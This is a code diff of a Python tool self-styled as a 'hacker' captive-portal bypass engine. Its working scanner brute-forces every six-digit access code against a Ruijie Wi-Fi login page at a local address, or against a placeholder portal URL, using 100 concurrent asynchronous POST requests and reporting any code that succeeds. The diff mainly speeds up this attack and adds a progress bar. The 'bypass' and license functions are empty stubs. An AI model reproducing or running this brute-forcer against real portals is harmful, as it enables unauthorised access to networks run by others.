@@ -1,16 +1,14 @@
-import asyncio, aiohttp, requests, re, urllib3, time, os, uuid, sys, datetime, random
+import asyncio, aiohttp, requests, time, os, uuid, sys, urllib3
 from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
-from rich.text import Text
+from tqdm import tqdm
 
-# ===============================
-# CONFIGURATION
-# ===============================
+# SETUP
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
-URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 
+# CONFIG
 PORTALS = {
     "1": {"name": "Ruijie Old Portal", "url": "http://192.168.60.1/auth", "payload": "code"},
     "2": {"name": "Modern Captive Portal", "url": "http://target-portal.com/login", "payload": "password"}
@@ -19,14 +17,11 @@ PORTALS = {
 BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
 BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"
 
-# ===============================
-# UTILS & LICENSE
-# ===============================
 def display_hacker_flag():
     console.clear()
     console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
-    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v6.5 (FULL)[/bold cyan]\n"))
+    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v7.0 (ULTRA SPEED)[/bold cyan]\n"))
 
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
@@ -36,67 +31,58 @@ def get_hwid():
     with open(id_file, "w") as f: f.write(new_id)
     return new_id
 
-def check_license_hacker_style():
-    my_hwid = get_hwid()
-    display_hacker_flag()
-    console.print(Align.center(Panel(f"[bold white]HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="bold cyan", expand=False)))
-    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
-    # (License validation logic here)
-    return True 
-
-# ===============================
-# ASYNC SCANNER
-# ===============================
-async def scan(session, code, target_cfg):
-    try:
-        async with session.post(target_cfg['url'], data={target_cfg['payload']: code}, timeout=2) as resp:
-            text = await resp.text()
-            if "Success" in text or "200" in str(resp.status):
-                console.print(f"[bold green][!] Found Hit: {code}[/bold green]")
-                return True
-    except: pass
+# SCANNER LOGIC (HIGH SPEED)
+async def bounded_scan(sem, session, code, target_cfg):
+    async with sem:
+        try:
+            async with session.post(target_cfg['url'], data={target_cfg['payload']: code}, timeout=2) as resp:
+                text = await resp.text()
+                if resp.status == 200 and "Success" in text:
+                    console.print(f"\n[bold green][!] FOUND HIT: {code}[/bold green]")
+                    return True
+        except: pass
     return False
 
 async def run_scanner(target_cfg):
-    console.print(f"[yellow][*] Scanning {target_cfg['name']}...[/yellow]")
-    async with aiohttp.ClientSession() as session:
+    console.print(f"[yellow][*] Starting Ultra Speed Scan: {target_cfg['name']}[/yellow]")
+    connector = aiohttp.TCPConnector(limit=100)
+    sem = asyncio.Semaphore(100)
+    
+    async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
-        for i in range(100000, 999999):
-            tasks.append(scan(session, str(i), target_cfg))
-            if len(tasks) >= 500:
-                await asyncio.gather(*tasks)
-                tasks = []
+        # tqdm progress bar
+        for i in tqdm(range(100000, 999999), desc="Scanning Codes"):
+            task = asyncio.create_task(bounded_scan(sem, session, str(i), target_cfg))
+            tasks.append(task)
         await asyncio.gather(*tasks)
 
-# ===============================
-# BYPASS ENGINE
-# ===============================
-def start_bypass_process():
-    console.print("[yellow][*] Starting Bypass Engine...[/yellow]")
-    # ဒီနေရာမှာ အရင်က သုံးနေတဲ့ Session/Redirect Logic တွေကို ထည့်ပါ
-    time.sleep(2)
-    console.print("[green]>>> Bypass Active![/green]")
-
-# ===============================
 # MAIN
-# ===============================
 if __name__ == "__main__":
-    if check_license_hacker_style():
+    display_hacker_flag()
+    hwid = get_hwid()
+    console.print(Panel(f"[bold white]HWID: {hwid}[/bold white]", title="[bold cyan]SECURITY[/bold cyan]"))
+    user_key = input("\n [?] Enter Key: ")
+    
+    # License Check Logic (Placeholder)
+    if user_key:
         while True:
             display_hacker_flag()
             console.print(Panel("[bold white]1. Start Bypass\n2. Start Scanner\n3. Exit[/bold white]", title="[bold cyan]MENU[/bold cyan]"))
-            choice = input(" [?] Choose Option: ")
+            choice = input(" [?] Option: ")
             
             if choice == "1":
-                start_bypass_process()
+                console.print("[yellow][*] Bypass Engine Initialized...[/yellow]")
+                time.sleep(1)
             elif choice == "2":
-                console.print("[white]Choose Target:[/white]\n1. Old Portal\n2. New Portal")
-                target_choice = input(" [?] >> ")
+                console.print("Choose Target:\n1. Old Portal\n2. New Portal")
+                target_choice = input(" >> ")
                 target = PORTALS.get(target_choice)
                 if target:
                     try:
                         asyncio.run(run_scanner(target))
                     except KeyboardInterrupt:
-                        console.print("\n[red]Scanning Stopped![/red]")
+                        console.print("\n[red]Scanner Stopped![/red]")
+                else:
+                    console.print("[red]Invalid Target![/red]")
             elif choice == "3":
                 sys.exit()
